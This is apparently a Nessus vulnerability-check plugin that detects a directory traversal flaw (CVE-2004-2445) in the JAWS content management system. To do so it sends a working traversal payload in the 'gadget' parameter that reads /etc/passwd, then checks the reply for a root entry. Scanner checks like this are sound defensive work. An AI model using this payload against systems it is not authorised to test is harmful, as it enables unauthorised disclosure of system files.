#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(16198);
 script_cve_id("CVE-2004-2445");
 script_bugtraq_id(10670);
 script_osvdb_id(7722);

 script_version("$Revision: 1.15 $");
 script_name(english:"JAWS index.php gadget Parameter Traversal Arbitrary File Access");
 script_summary(english:"Checks for a file reading flaw in JAWS");
 
 script_set_attribute( attribute:"synopsis", value:
"A web application running on the remote host has a directory
traversal vulnerability." );
 script_set_attribute( attribute:"description", value:
"The remote web server is running JAWS, a content management system
written in PHP.

Input to the 'gadget' parameter of index.php is not properly
sanitized.  A remote attacker could exploit this to read potentially
sensitive data from the system.  This information could also be used
to mount further attacks.

This version of JAWS also reportedly has cross-site scripting and
authentication bypass vulnerabilities, though Nessus has not checked
for those issues." );
 script_set_attribute(attribute:"see_also",
   value:"http://seclists.org/fulldisclosure/2004/Jul/271");
 script_set_attribute(attribute:"solution", 
   value:"Upgrade to the latest version of this software." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/01/18");
 script_set_attribute(attribute:"vuln_publication_date", value: "2004/07/05");
 script_cvs_date("$Date: 2016/11/19 01:42:50 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses");
 script_copyright(english:"This script is Copyright (C) 2005-2016 Tenable Network Security, Inc.");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

 exit(0);
}

# Check starts here

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);

foreach dir ( cgi_dirs() )
{
 url = dir + '/index.php?gadget=../../../../../../etc/passwd%00&path=/etc';
 res = http_send_recv3(method:"GET", item:url, port:port);
 if (isnull(res)) exit(1, "The server didn't respond.");

 if ( egrep(pattern:"root:.*:0:[01]:.*:.*:", string:res[2]) )
 {
   if (report_verbosity > 0)
   {
     report = string(
       "\nNessus detected this by requesting the following URL :\n\n",
       "  ", build_url(qs:url, port:port), "\n"
     );

     if (report_verbosity > 1)
       report += string("\nWhich yielded :\n\n", res[2], "\n");

     security_warning(port:port, extra:report);
   }
   else security_warning(port);

   exit(0);
 }
}
